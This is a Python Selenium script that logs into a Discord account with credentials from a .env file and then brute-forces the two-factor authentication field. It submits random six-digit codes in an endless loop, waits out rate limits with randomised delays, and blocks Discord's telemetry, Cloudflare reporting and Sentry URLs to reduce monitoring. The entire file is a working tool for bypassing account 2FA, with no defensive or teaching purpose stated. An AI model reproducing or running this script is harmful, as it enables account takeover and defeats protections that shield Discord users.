# Import dependencies and libraries
import os
import time
from dotenv import load_dotenv
import secrets
from lib.codegen import genNormal
from lib.textcolor import toColor

# Import Selenium libraries and dependencies
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By

# Load in the credentials from .env
load_dotenv()

# Get the Chromium web driver
driver = webdriver.Chrome(ChromeDriverManager().install())

# Set the email and password variables from the environment variables
email = os.getenv('EMAIL')
password = os.getenv('PASSWORD')

def main():
	#Blocking cloudflare, sentry.io and discord science URLS (analytics and monitoring URLS)
	driver.execute_cdp_cmd('Network.setBlockedURLs', {
		"urls": [
			"a.nel.cloudflare.com/report", 
			"https://discord.com/api/v9/science",
			"sentry.io"
		]
	})
	# Enable the network connectivity of the browser
	driver.execute_cdp_cmd('Network.enable', {})
	# Go to the discord login page
	driver.get("https://www.discord.com/login")
	options = webdriver.ChromeOptions() 
	# Clean up the program log
	options.add_experimental_option("excludeSwitches", ["enable-logging"])
	# Wait 1 second before typing the email and password
	time.sleep(1)

	# Find the email and password login fields
	loginEmail = driver.find_element(by=By.NAME, value="email")
	loginPassword = driver.find_element(by=By.NAME, value="password")
	# Enter the email and password
	loginEmail.send_keys(email)
	loginPassword.send_keys(password)
	# Click Enter/Return to enter the password
	loginPassword.send_keys(Keys.RETURN)
	# Set up the statistics variables
	totpCount = 0
	ratelimitCount = 0

	#loginTOTP = otp input field. TOTP stands for Timed One Time Password
	# Constantly run the script
	while (True):
		# Attempt to find the TOTP login field
		try:
			loginTOTP = driver.find_element(by=By.XPATH, value="//*[@aria-label='Enter Discord Auth/Backup Code']")
			time.sleep(0.5)
			start = time.time()
			sleepy = 0
			#Logic to continuously enter OTP codes
			while (True):
				# Generate a new 6 digit number and enter it into the TOTP field
				totp = genNormal(1)
				loginTOTP.send_keys(totp)
				loginTOTP.send_keys(Keys.RETURN)
				totpCount += 1

				#Test if Discord ratelimits us
				if ("The resource is being rate limited." in driver.page_source):
					# Log the ratelimit event and wait 7-12 seconds randomly
					print(toColor("Ratelimited.", "yellow"))
					sleepy = secrets.choice(range(7, 12))
					ratelimitCount += 1
				# This means that Discord has expired this login session.
				elif ("Invalid two-factor auth ticket" in driver.page_source):
					# This means that Discord has expired this login session.
					#  Print this out as well as some statistics, and prompt the user to retry.
					elapsed = time.time() - start
					print(toColor("Invalid session ticket. The Discord login session has expired, try to run the program again.", "red"))
					print(toColor(f"Number of tried codes: {totpCount}", "blue"))
					print(toColor(f"Time elapsed for codes: {elapsed}", "blue"))
					print(toColor(f"Number of ratelimits {ratelimitCount}", "blue"))
					# Close the browser.
					driver.close()
				# The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
				else:
					sleepy = secrets.choice(range(6, 10))

				#Testing if the main app UI renders.
				try:
					# Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
					time.sleep(1)
					loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
					print(toColor(f"Code {totp} worked!"))
					break
				except NoSuchElementException:
					# This means that the login was unsuccessful.
					time.sleep(sleepy)
					# Backspace the previously entered TOTP code.
					for i in range(6):
						loginTOTP.send_keys(Keys.BACKSPACE)

					print("Code " + toColor(totp, "blue") + " did not work, delay: " + toColor(sleepy, "blue"))

		# If the TOTP login field is not found (e.g the user hasn't completed the Captcha, then try again
		except (NoSuchElementException):
			pass

if __name__ == "__main__":
	# Run the program.
	main()
